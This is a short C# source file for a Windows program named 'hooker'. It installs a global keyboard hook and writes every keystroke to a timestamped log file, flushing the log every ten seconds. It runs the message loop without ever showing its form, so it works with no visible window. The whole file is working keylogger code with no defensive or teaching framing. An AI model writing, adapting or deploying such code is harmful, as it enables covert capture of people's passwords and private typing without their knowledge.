using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Ownskit.Utils;
using System.IO;
using System.ComponentModel;

namespace hooker
{
    static class Program

    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            KeyboardListener kl = new KeyboardListener();
            kl.KeyDown += new RawKeyEventHandler(kl_KeyDown);

            fs = new StreamWriter(DateTime.Now.ToString("d.MMM.yyyy-T.HH.mm.ss") + ".log");


            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Form1 TheForm = new Form1();
            Application.ApplicationExit += (object sender, EventArgs e) => fs.Close();
            AppDomain.CurrentDomain.ProcessExit += (object sender, EventArgs e) => fs.Close();


            Timer flusher = new Timer();
            flusher.Interval = 10000;
            flusher.Tick += (object sender, EventArgs e) => fs.Flush();
            flusher.Start();

            Application.Run();
        }
        static StreamWriter fs;
        static void kl_KeyDown(object sender, RawKeyEventArgs args)
        {
            int TIMELIMIT_MS = 2000;
            if (Environment.TickCount - prevKeyTime >= TIMELIMIT_MS)
            {
                fs.WriteLine();
                fs.WriteLine(">>---  > 2 sec  ---<<");
            }
            prevKeyTime = Environment.TickCount;
            fs.Write(args.Character);
        }

        static int prevKeyTime = 0;
    }
}


